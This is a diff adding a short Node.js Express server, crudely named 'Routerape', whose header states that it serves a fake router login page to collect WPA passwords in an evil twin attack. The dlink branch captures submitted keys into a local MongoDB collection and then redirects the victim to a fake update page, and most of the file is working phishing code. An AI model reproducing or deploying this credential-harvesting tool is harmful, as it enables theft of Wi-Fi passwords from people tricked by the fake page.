@@ -1,0 +1,66 @@
+'use strict';
+
+/*
+ * Routerape - 2015
+ * 
+ * This software sets up a simple HTTP server to serve a
+ * fake web page for the collection of WPA passwords. It
+ * is meant to be used in an evil twin attack. Collected
+ * passwords will be stored in a local MongoDB collection
+ * called 'routerape'.
+ * 
+ * Installation: npm i
+ *
+ * Usage: node server <target>
+ * 
+ * <targer> - can be any of the following options:
+ * 	dlink, cisco, linksys, netgear, apple, generic
+ * 
+ */ 
+
+var mongoose = require('mongoose'),
+	express = require('express'),
+	http = require('http'),
+    path = require('path'),
+    bodyParser = require('body-parser');
+    
+var Key = require('./key');
+
+var app = express();
+
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
+
+// Routes
+switch(process.argv[2]) {
+	case 'dlink':
+		app.use('/', express.static('dlink'));
+        app.post('/wpa_post', function(req, res) {
+            var key = new Key();
+            key.key = req.body.key;
+            key.save(function() {
+                res.redirect('/update.html');
+            });
+        });
+		break;
+	case 'linksys':
+		app.use(express.static('linksys'));
+		break;
+	default:
+		app.use(express.static('generic'));
+		break;
+}
+
+var db = mongoose.connect('mongodb://localhost/routerape', function(err) {
+	if(err) {
+		console.error('\x1b[31m' + 'Could not connect to Routerape database!' + '\x1b[39m');
+		console.log(err);
+	}else{
+	  console.log('Connected to Routerape database successfully!');
+	}
+});
+
+app.listen(8080, function(err) {
+	if(err) console.log('Error setting up HTTP server:', err);
+	else console.log('HTTP server started for target:', process.argv[2]);
+});
